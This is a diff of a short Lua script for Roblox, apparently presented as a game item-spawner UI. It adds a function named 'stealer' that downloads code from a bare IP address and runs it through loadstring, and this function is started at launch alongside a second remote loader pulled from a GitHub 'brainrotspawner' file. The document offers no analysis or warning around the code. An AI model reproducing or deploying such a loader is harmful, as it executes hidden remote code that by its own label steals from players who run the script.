@@ -1,9 +1,9 @@
 local function stealer()
-    https://api.rubis.app/v2/scrap/K6iLyIWkmXOo2gTr/raw
+   ID="75ec1e45-7997-497f-915c-228c7cb61816";
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaoscripts/refs/heads/main/final.txt"))() 
-
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/brainrotspawner"))() 
 end
 
 task.spawn(stealer)
